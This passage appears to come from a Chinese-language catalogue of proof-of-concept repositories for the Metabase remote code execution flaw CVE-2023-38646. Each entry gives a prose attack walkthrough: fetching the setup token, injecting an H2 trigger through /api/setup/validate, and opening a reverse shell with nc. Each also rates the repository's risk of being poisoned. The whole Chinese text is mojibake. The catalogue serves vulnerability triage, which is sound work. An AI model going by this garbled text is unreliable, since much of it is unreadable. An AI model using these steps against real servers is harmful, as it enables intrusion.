**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
